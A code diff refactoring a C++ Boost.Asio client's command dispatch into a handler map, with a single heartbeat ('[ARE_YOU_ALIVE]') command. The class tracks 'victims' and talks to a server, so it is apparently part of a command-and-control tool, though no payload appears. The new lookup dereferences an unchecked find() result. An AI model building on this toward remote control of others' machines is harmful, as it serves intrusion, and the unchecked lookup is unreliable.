@@ -1,8 +1,14 @@
 #include "client.h"
 
-client::client(io::io_context &io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port, msg_parser& msg_parser, victims* victims)
-    : io_context(io_context), acceptor(io_context, tcp::endpoint(tcp::v4(), port)), server_ip_(server_ip), server_port_(server_port), victims_(victims) {
-    this->msg_parser_ = msg_parser;
+client::client(io::io_context& io_context, std::uint16_t port, std::string server_ip, std::uint16_t server_port, victims* victims)
+    : io_context(io_context),
+      acceptor(io_context, tcp::endpoint(tcp::v4(), port)),
+      server_ip_(server_ip),
+      server_port_(server_port),
+      victims_(victims) {
+	commands_ = {
+	    {"[ARE_YOU_ALIVE]", boost::bind(&client::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2)},
+	};
 }
 
 void client::start() {
@@ -21,39 +27,16 @@ void client::start() {
 	server->read();
 }
 
-client::command_code client::hash_command (std::string const& in_command) {
-    if (in_command == "[ALIVE]") return eARE_YOU_ALIVE;
+void client::handleResponse(std::string& query, session* client) {
+	std::cout << client->endpoint_ << " Incoming query: " << query << std::endl;
 
-    return eCOMMAND_NOT_FOUND;
+	std::map<std::string, std::vector<std::string>> parsed_msg = msg_parser_.parse_msg(query);
+
+	if (parsed_msg["is_valid_msg"][0] == "false") {
+		return;
+	}
+	auto handler = commands_.find(parsed_msg["command"][0])->second;
+	if (handler) handler(parsed_msg["params"], client);
 }
 
-
-void client::handleResponse(std::string &query, session *client) {
-	std::cout << client->endpoint_ << "[SERVER SAYS]: " << query << std::endl;
-
-    std::map<std::string, std::vector<std::string>> parsed_msg = msg_parser_.parse_msg(query);
-
-    if (parsed_msg["is_valid_msg"][0] == "false") {
-        return;
-    }
-
-
-    switch (hash_command(parsed_msg["command"][0])) {
-
-        case eARE_YOU_ALIVE:
-            client->send("ALIVE;True\n");
-            break;
-
-
-        case eCOMMAND_NOT_FOUND:
-            std::cout << "COMMAND NOT FOUND [FROM CLIENT]";
-            break;
-
-
-        default:
-            std::cout << "Can't interpret msg [FROM CLIENT]";
-            break;
-
-    }
-
-}
+void client::handleAlive(std::vector<std::string>& params, session* client) { client->send(":msg [ARE_YOU_ALIVE] 1\n"); }
